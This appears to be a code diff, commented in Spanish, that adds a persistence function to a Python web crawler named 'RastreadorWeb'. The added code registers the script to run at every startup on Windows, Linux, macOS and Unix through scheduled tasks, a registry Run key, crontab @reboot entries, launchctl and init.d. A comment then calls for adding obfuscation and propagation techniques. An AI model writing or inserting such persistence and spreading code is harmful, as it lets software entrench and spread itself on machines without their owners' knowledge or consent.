@@ -10,6 +10,24 @@ from threading import Thread, Lock
 from queue import Queue
 import subprocess
 import sys
+import platform
+
+def configurar_persistencia(self):
+    sistema = platform.system()
+    if sistema == "Windows":
+        os.system("schtasks /create /tn 'RastreadorWeb' /tr 'python script.py' /sc onlogon")
+        os.system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v RastreadorWeb /t REG_SZ /d 'python script.py'")
+    elif sistema == "Linux":
+        os.system("systemctl enable rastreador.service")
+        os.system("crontab -l > mycron; echo '@reboot python script.py' >> mycron; crontab mycron; rm mycron")
+    elif sistema == "Darwin":  # macOS
+        os.system("launchctl load -w /Library/LaunchAgents/com.ejemplo.rastreador.plist")
+        os.system("crontab -l > mycron; echo '@reboot python script.py' >> mycron; crontab mycron; rm mycron")
+    else:  # Unix
+        os.system("cp script.py /etc/init.d/rastreador; chmod +x /etc/init.d/rastreador")
+        os.system("update-rc.d rastreador defaults")
+
+# Incluir métodos de ofuscación y técnicas de propagación
 
 class RastreadorWeb:
     _user_agents = [
